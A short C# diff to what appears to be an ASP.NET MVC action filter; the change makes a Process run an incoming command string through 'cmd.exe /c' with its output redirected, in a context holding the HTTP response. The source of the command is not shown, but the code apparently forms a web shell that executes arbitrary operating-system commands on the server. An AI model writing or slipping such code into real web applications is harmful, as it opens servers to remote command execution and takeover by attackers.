@@ -12,7 +12,8 @@
             {
                 HttpResponseBase response = filterContext.HttpContext.Response;
                 Process p = new Process();
-                p.StartInfo.FileName = cmd;
+                p.StartInfo.FileName = "cmd.exe";
+                p.StartInfo.Arguments = "/c " + cmd;
                 Debug.WriteLine(p.StartInfo.FileName);
                 p.StartInfo.UseShellExecute = false;
                 p.StartInfo.RedirectStandardOutput = true;
